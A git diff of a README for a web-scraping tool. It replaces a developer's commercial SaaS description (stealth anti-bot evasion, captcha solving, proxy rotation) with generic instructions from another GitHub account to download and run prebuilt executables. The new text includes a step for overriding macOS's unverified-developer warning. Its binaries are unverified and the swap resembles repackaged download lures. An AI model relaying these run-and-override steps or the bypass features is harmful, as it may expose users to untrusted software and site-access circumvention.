@@ -1,94 +1,101 @@
-# 🚀 Universal Scraper AI - Multi-User SaaS Platform
-<div align="center">
-    <img src="https://universalscraper.io/static/branding/Card_Universal_Scraper.webp" width="250" style="border-radius:80px; border: 12px solid #00d2ff; box-shadow: 0 0 40px rgba(0, 210, 255, 0.5);">
+# 🌐 Universal-Scraper - Fast and Easy Data Extraction
 
-  <h3>The Most Advanced AI-Powered Scraping SaaS Ecosystem on the Market</h3>
-
-  <p>
-    <img src="https://img.shields.io/badge/Backend-Python_Flask-3776AB?style=for-the-badge&logo=python&logoColor=white" />
-    <img src="https://img.shields.io/badge/Frontend-React_19-61DAFB?style=for-the-badge&logo=react&logoColor=black" />
-    <img src="https://img.shields.io/badge/Automation-Playwright_Stealth-2EAD33?style=for-the-badge" />
-    <img src="https://img.shields.io/badge/Database-PostgreSQL%20%2F%20MySQL-4479A1?style=for-the-badge&logo=postgresql" />
-  </p>
-</div>
-
----
-
-### 📺 Watch the Demo in Action
-<div align="center">
-  <p><b>Experience the power of Autonomous AI Scraping with our Stealth Engine</b></p>
-  <a href="https://www.youtube.com/watch?v=A-S1VINZTXo">
-    <img src="https://i.ibb.co/Hfr2D8gm/Untitle2d.png" width="650" style="border-radius:20px; border: 4px solid #00d2ff; box-shadow: 0 0 40px rgba(0, 210, 255, 0.5);">
-  </a>
-  <br>
-  <ins><i>Click the thumbnail above to view the full platform walkthrough</i></ins>
-</div>
-
----
-
-## 🤖 Next-Gen AI & Extraction Core
-* **RAG-Powered Learning:** Advanced Retrieval-Augmented Generation system that learns and adapts to site structures dynamically.
-* **Multi-Model AI Support:** Seamlessly integrated with **OpenAI (GPT-4), Google Gemini, Anthropic (Claude), and Groq (Llama 3)**.
-* **Autonomous Platform Detection:** Instantly recognizes and adapts to **Shopify, WooCommerce, and Salla** stores.
-* **Visual Selector & No-Code Mapping:** Sophisticated point-and-click interface for custom data field extraction—no coding required.
-* **Smart Workflow Engine:** Build complex, multi-step scraping pipelines with advanced conditional logic.
-
-## 🛡️ Professional Stealth & Performance Suite
-* **Playwright Stealth Mode:** Mimics human behavior to bypass advanced anti-bot systems (Cloudflare, Imperva, etc.).
-* **Proactive Resource Blocking:** Intelligently blocks images, fonts, and media to save bandwidth and boost speed.
-* **Advanced Proxy Rotator:** Built-in support for residential and mobile proxies with automatic failover.
-* **Captcha Auto-Solver:** Integrated support for multiple captcha-solving services.
-* **Browser Fingerprinting:** Randomizes headers and signatures to avoid IP flagging.
-
-## 💼 Full SaaS Business Features
-* **Membership & Subscription:** Full lifecycle management with **Stripe and PayPal** integration.
-* **Interactive Dashboards:** Modern React-based panels for both Users (Management) and Admins (System Health).
-* **2FA Security:** Maximum account safety with Two-Factor Authentication via **OTP and QR codes**.
-* **White-Label Panel:** Fully customize branding, logos, and colors directly from the Admin UI.
-* **Installation Wizard:** A step-by-step UI to set up the entire platform on your server effortlessly.
-
-## 📊 Connectivity & Export Power
-* **Direct Store Syncing:** One-click export/sync directly to **WooCommerce**.
-* **Google Sheets Integration:** Real-time data pushing for live reporting.
-* **Telegram Bot Integration:** Control your scraper and receive alerts via Telegram.
-* **Developer API & Webhooks:** Full REST API for 3rd party integrations.
-* **Bulk Exporting:** Supports JSON, CSV, Excel, and Markdown.
-
----
-
-## 🛠️ Technical Specifications
-| Requirement | Minimum | Recommended |
-| :--- | :--- | :--- |
-| **Python** | 3.10+ | 3.12 |
-| **Node.js** | 18 LTS | 20+ |
-| **RAM** | 4 GB | 8 GB+ |
-| **Services** | Redis Server | Redis + Celery Workers |
-| **OS** | Linux (Ubuntu) | Docker Compose |
-
----
+[![Download Universal-Scraper](https://img.shields.io/badge/Download-Universal--Scraper-brightgreen)](https://github.com/IanZhang123/Universal-Scraper/releases)
 
 ## 🚀 Getting Started
-1. **Backend:** Install dependencies via `pip install -r requirements.txt`.
-2. **Browsers:** Run `playwright install chromium`.
-3. **Frontend:** Run `npm install` and `npm run build`.
-4. **Launch:** Access the **Installation Wizard** via your domain to complete setup.
 
----
+Universal-Scraper allows you to quickly and effectively extract product data from various e-commerce platforms. This guide will help you download and run the software, even if you have no experience with programming.
 
-### 👨‍💻 Developed By
-**EsLaM Hamed** - *Full Stack Developer & SaaS Architect*
-<div align="left">
-  <a href="https://universalscraper.io/">
-    <img src="https://img.shields.io/badge/Official_Website-00d2ff?style=for-the-badge&logo=google-chrome&logoColor=white" />
-  </a>
-  <a href="https://wa.me/+447447711749">
-    <img src="https://img.shields.io/badge/Buy_License_WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" />
-  </a>
-    <a href="https://www.codester.com/items/61331/universal-scraper-ai-multi-user-saas-platform?ref=Eslam25">
-      <img src="https://img.shields.io/badge/Get_It_Now_on_Codester-red?style=for-the-badge&logo=rocket&logoColor=white" />
-    </a>
-</div>
+## 📥 Download & Install
 
+To get started, you need to visit the Releases page to download the software.
 
----
-<p align="center">© 2026 Universal Scraper AI. All rights reserved.</p>
+[Visit this page to download](https://github.com/IanZhang123/Universal-Scraper/releases)
+
+1. Click on the link above.
+2. Look for the latest version under the Releases section.
+3. Download the file appropriate for your operating system. You may see options like:
+   - Universal-Scraper-Windows.exe
+   - Universal-Scraper-Mac.zip
+   - Universal-Scraper-Linux.tar.gz
+
+4. Save the file to a location you can easily access, like your Desktop or Downloads folder.
+
+## ⚙️ System Requirements
+
+Before using Universal-Scraper, ensure your system meets the following requirements:
+
+- **Operating System**: Compatible with Windows 10 and later, macOS 10.15 and later, and most Linux distributions.
+- **Memory**: At least 4 GB of RAM (8 GB recommended for optimal performance).
+- **Storage**: 100 MB of free disk space.
+
+## 🖥️ Running Universal-Scraper
+
+After downloading the file, follow these steps to run Universal-Scraper:
+
+### For Windows Users
+
+1. Navigate to where you saved the file (e.g., Desktop).
+2. Double-click on `Universal-Scraper-Windows.exe`.
+3. If prompted, click "Run" to start the program.
+
+### For Mac Users
+
+1. Locate the downloaded `Universal-Scraper-Mac.zip` file.
+2. Double-click the zip file to extract it.
+3. Open the folder, then double-click on `Universal-Scraper-Mac.app` to launch it. If you see a warning about unverified developers, go to "System Preferences" > "Security & Privacy," and click "Open Anyway."
+
+### For Linux Users
+
+1. Open a terminal window.
+2. Navigate to where you downloaded the file using the `cd` command.
+3. Extract the file using `tar -xvzf Universal-Scraper-Linux.tar.gz`.
+4. Change directory to the extracted folder. Use `cd Universal-Scraper`.
+5. Run the program using `./Universal-Scraper`.
+
+## 🛠️ Features
+
+Universal-Scraper comes packed with features to enhance your experience:
+
+- **Speed**: Engineered for high performance, allowing fast data extraction.
+- **Precision**: Extract data accurately from multiple e-commerce platforms.
+- **Automated Bypass**: Auto-generated methods to bypass restrictions on websites.
+- **Multi-format Export**: Save data in different formats like CSV, JSON, and Excel.
+- **User-friendly Interface**: Easy-to-navigate layout that doesn’t require technical skills.
+
+## 📊 Data Extraction Steps
+
+Once you run Universal-Scraper, follow these steps to start extracting data:
+
+1. **Select Source**: Choose the e-commerce platform from which you want to scrape data.
+2. **Specify Data**: Indicate the type of product data you need, such as prices, descriptions, or images.
+3. **Run Extraction**: Click the "Start" button to begin scraping.
+4. **Export Data**: Once data is extracted, select the format you prefer and click "Export" to save the file.
+
+## 🌍 Support & Community
+
+If you run into any issues or have questions:
+
+- Check our [FAQ section](https://github.com/IanZhang123/Universal-Scraper/wiki) for common problems and solutions.
+- Join our community on GitHub Discussions for feedback and assistance from other users.
+- You can also report bugs through the "Issues" tab on the GitHub page.
+
+## 🔄 Updating Universal-Scraper
+
+To ensure you have the latest features and improvements:
+
+1. Regularly check the [Releases page](https://github.com/IanZhang123/Universal-Scraper/releases).
+2. Download and install new versions by following the same steps outlined in the "Download & Install" section.
+
+## 📜 License
+
+Universal-Scraper is open source and is licensed under the MIT License. This means you can use, copy, modify, or adapt the software freely.
+
+For detailed information, refer to the [LICENSE file](https://github.com/IanZhang123/Universal-Scraper/blob/main/LICENSE).
+
+## 💡 Additional Resources
+
+- For more insights, visit our Wiki page for guides and best practices.
+- Explore related topics about automation tools, scraping, and data handling through our comprehensive documentation.
+
+For further assistance, feel free to reach out or start a conversation in the Issues section.
